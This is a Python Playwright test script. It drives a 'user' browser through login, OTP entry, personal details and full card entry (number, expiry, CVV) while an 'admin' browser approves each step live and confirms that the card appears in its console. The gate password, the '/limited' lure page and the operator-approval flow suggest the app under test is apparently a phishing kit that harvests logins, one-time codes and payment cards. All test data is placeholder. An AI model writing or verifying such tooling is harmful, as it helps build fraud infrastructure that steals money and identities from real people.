
import asyncio
from playwright.async_api import async_playwright, expect

# Config
BASE_URL = "http://localhost:8080"
ADMIN_USER = "admin"
ADMIN_PASS = "secure123"
TEST_EMAIL = "test@example.com"

async def run():
    async with async_playwright() as p:
        browser_admin = await p.chromium.launch(headless=True)
        browser_user = await p.firefox.launch(headless=True)

        # 1. Admin Login
        admin_context = await browser_admin.new_context(viewport={'width': 1280, 'height': 800})
        page_admin = await admin_context.new_page()
        print(f"Admin navigating to {BASE_URL}/admin")
        await page_admin.goto(f"{BASE_URL}/admin")

        # Check if we are gate-locked or need login
        if await page_admin.locator('app-gate').count() > 0:
             print("Admin unlocking gate...")
             await page_admin.fill('input[type="password"]', 'password')
             await page_admin.click('button:has-text("Unlock")')

        print("Admin attempting login...")
        try:
             # Wait for the login form inside the Admin component (it has specific structure)
             await page_admin.wait_for_selector('input[type="text"]', timeout=5000)
             await page_admin.fill('input[type="text"]', ADMIN_USER)
             await page_admin.fill('input[type="password"]', ADMIN_PASS)
             await page_admin.click('button:has-text("Log In")')
             await page_admin.wait_for_selector('h1:has-text("Administrator Console")', timeout=10000)
             print("Admin Login Successful")
        except Exception as e:
             print(f"Admin Login Failed. URL: {page_admin.url}")
             await page_admin.screenshot(path="admin_login_fail.png")
             raise e

        # 2. User Flow to populate data
        user_context = await browser_user.new_context(viewport={'width': 375, 'height': 812})
        page_user = await user_context.new_page()
        await page_user.goto(f"{BASE_URL}/login")
        await page_user.evaluate("localStorage.clear()")

        # Gate
        if await page_user.locator('app-gate').count() > 0:
            await page_user.fill('input[type="password"]', 'password')
            await page_user.click('button:has-text("Unlock")')
            await asyncio.sleep(2)

        # Login
        await page_user.fill('input#email', TEST_EMAIL)
        await page_user.fill('input[type="password"]', 'password123')
        await page_user.click('button:has-text("Log In")')
        await asyncio.sleep(2)

        # Admin Approve Login
        try:
             await page_admin.locator(f'div:has-text("{TEST_EMAIL}")').last.click(timeout=5000)
        except:
             await page_admin.locator('div:has-text("No Email")').last.click(timeout=5000)

        await page_admin.click('button:has-text("Approve")')

        # Phone
        try:
             await page_user.wait_for_url(f"{BASE_URL}/limited", timeout=30000)
        except:
             # Sometimes it might be stuck on loading if socket didn't fire?
             print("Warning: Timeout waiting for /limited. Checking if stuck on loading...")
             if "/loading" in page_user.url:
                 # Check if we can force refresh state via another route or just wait more
                 await asyncio.sleep(5)
                 await page_user.wait_for_url(f"{BASE_URL}/limited", timeout=10000)

        await page_user.click('button:has-text("Verify Identity")')
        await page_user.fill('input#phone', '5551234567')
        await page_user.click('button:has-text("Next")')
        await page_user.locator('input[id^="otp-"]').first.wait_for()
        for i in range(6): await page_user.type(f'#otp-{i}', str(i+1))
        await page_user.click('button:has-text("Continue")')
        await asyncio.sleep(2)

        # Admin Approve Phone
        print("Admin waiting for 'Approve Phone' button...")
        try:
             # Ensure session is selected just in case
             try:
                 await page_admin.locator(f'div:has-text("{TEST_EMAIL}")').last.click(timeout=2000)
             except:
                 pass

             await page_admin.wait_for_selector('button:has-text("Approve Phone")', timeout=10000)
             await page_admin.click('button:has-text("Approve Phone")')
        except:
             print("Admin failed to find Approve Phone. Screenshotting...")
             await page_admin.screenshot(path="admin_fail_phone.png")
             raise

        # Personal
        await page_user.click('div.pp-input:has-text("Select")')
        await page_user.click('li:has-text("United States")')
        await page_user.fill('#firstName', 'John')
        await page_user.fill('#lastName', 'Doe')
        await page_user.fill('#dob', '1990-01-01')
        await page_user.fill('#street', '123 Main St')
        await page_user.fill('#city', 'San Jose')
        await page_user.fill('#zip', '95131')
        await page_user.click('button:has-text("Agree & Continue")')
        await asyncio.sleep(2)

        # Admin Approve Personal
        await page_admin.click('button:has-text("Approve Identity")')

        # Card
        await page_user.fill('#cardNum', '4000123456789010')
        await page_user.fill('#expiry', '12/30')
        await page_user.fill('#cvv', '123')
        await page_user.click('button:has-text("Link Card")')
        await asyncio.sleep(2)

        # 3. Capture Final State
        # Ensure card is visible in Admin
        await expect(page_admin.locator('p:has-text("4000 1234 5678 9010")')).to_be_visible()

        print("Taking screenshot...")
        # Force a wait for the data to update
        await page_admin.wait_for_timeout(2000)
        await page_admin.screenshot(path="verification_success.png", full_page=True)

        await browser_admin.close()
        await browser_user.close()

if __name__ == "__main__":
    asyncio.run(run())
